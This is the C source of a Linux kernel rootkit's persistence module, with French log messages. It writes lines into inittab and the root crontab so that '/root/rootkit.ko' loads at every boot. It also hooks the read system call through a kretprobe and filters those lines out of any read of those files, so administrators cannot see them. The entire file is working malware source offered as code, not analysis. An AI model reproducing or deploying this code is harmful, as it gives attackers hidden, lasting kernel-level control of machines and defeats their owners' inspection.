#include <linux/kernel.h>
#include <linux/fs.h>
#include <linux/file.h>
#include <linux/dcache.h>
#include <linux/slab.h>
#include <linux/string.h>
#include <linux/kprobes.h>
#include <linux/uaccess.h>
#include "persistence.h"

#define INSMOD_MARKER "/sbin/insmod /root/rootkit.ko"

static int write_and_sync(const char *path, const char *entry, int flags, umode_t mode)
{
    struct file *file;
    loff_t pos;
    int ret;

    file = filp_open(path, flags, mode);
    if (IS_ERR(file)) {
        printk(KERN_ERR "impossible d'ouvrir %s: %ld\n", path, PTR_ERR(file));
        return PTR_ERR(file);
    }

    pos = i_size_read(file_inode(file));
    ret = kernel_write(file, entry, strlen(entry), &pos);
    if (ret < 0) {
        printk(KERN_ERR "ecriture dans %s echouée: %d\n", path, ret);
        filp_close(file, NULL);
        return ret;
    }

    ret = vfs_fsync(file, 0);
    if (ret < 0)
        printk(KERN_WARNING "fsync sur %s echoué: %d\n", path, ret);

    filp_close(file, NULL);
    return 0;
}

static int get_inittab(void)
{
    int ret = write_and_sync(INITTAB_PATH,
                             "::sysinit:/sbin/insmod /root/rootkit.ko\n",
                             O_WRONLY | O_APPEND, 0);
    if (ret == 0)
        printk(KERN_INFO "ok la ligne est dans inittab\n");
    return ret;
}

static int get_cron(void)
{
    int ret = write_and_sync(CRONTAB_PATH,
                             "@reboot /sbin/insmod /root/rootkit.ko\n",
                             O_WRONLY | O_APPEND | O_CREAT, 0600);
    if (ret == 0)
        printk(KERN_INFO "ok la ligne est dans le crontab\n");
    return ret;
}

static ssize_t filter_insmod(char *buf, ssize_t len)
{
    char *out = buf;
    char *p   = buf;
    char *end = buf + len;

    while (p < end) {
        char *nl       = memchr(p, '\n', end - p);
        char *line_end = nl ? nl + 1 : end;
        size_t line_len = line_end - p;

        if (!strnstr(p, INSMOD_MARKER, line_len)) {
            if (out != p)
                memmove(out, p, line_len);
            out += line_len;
        }
        p = line_end;
    }
    return out - buf;
}

static int is_persist_file(int fd)
{
    struct file *f;
    char *buf, *p;
    int match = 0;

    f = fget(fd);
    if (!f)
        return 0;

    buf = kmalloc(256, GFP_KERNEL);
    if (!buf) {
        fput(f);
        return 0;
    }

    p = d_path(&f->f_path, buf, 256);
    if (!IS_ERR(p)) {
        if (strcmp(p, INITTAB_PATH) == 0 || strcmp(p, CRONTAB_PATH) == 0)
            match = 1;
    }

    kfree(buf);
    fput(f);
    return match;
}

struct read_data {
    char __user *ubuf;
    int target;
};

static int entry_read(struct kretprobe_instance *ri, struct pt_regs *regs)
{
    struct read_data *d = (struct read_data *)ri->data;
    const struct pt_regs *sys = (const struct pt_regs *)regs->di;

    d->ubuf   = (char __user *)sys->si;
    d->target = is_persist_file((int)sys->di);
    return 0;
}

static int ret_read(struct kretprobe_instance *ri, struct pt_regs *regs)
{
    struct read_data *d = (struct read_data *)ri->data;
    ssize_t ret = regs_return_value(regs);
    char *kbuf;
    ssize_t new_ret;

    if (!d->target || ret <= 0)
        return 0;

    kbuf = kmalloc(ret, GFP_KERNEL);
    if (!kbuf)
        return 0;

    if (copy_from_user(kbuf, d->ubuf, ret)) {
        kfree(kbuf);
        return 0;
    }

    new_ret = filter_insmod(kbuf, ret);

    if (copy_to_user(d->ubuf, kbuf, new_ret))
        printk(KERN_ERR "copy_to_user read hook échoué\n");

    regs->ax = new_ret;
    kfree(kbuf);
    return 0;
}

static struct kretprobe krp_read = {
    .handler        = ret_read,
    .entry_handler  = entry_read,
    .data_size      = sizeof(struct read_data),
    .maxactive      = 64,
    .kp.symbol_name = "__x64_sys_read",
};

int persistence_init(void)
{
    int ret;

    printk(KERN_INFO "tentative de persistence...\n");

    ret = get_inittab();
    if (ret < 0)
        printk(KERN_WARNING "inittab échoué, on essaie le cron\n");

    ret = get_cron();
    if (ret < 0)
        printk(KERN_WARNING "cron aussi échoué, tant pis\n");

    ret = register_kretprobe(&krp_read);
    if (ret < 0)
        printk(KERN_WARNING "hook read échoué: %d\n", ret);
    else
        printk(KERN_INFO "lecture inittab/crontab filtrée\n");

    return 0;
}

void persistence_exit(void)
{
    unregister_kretprobe(&krp_read);
}
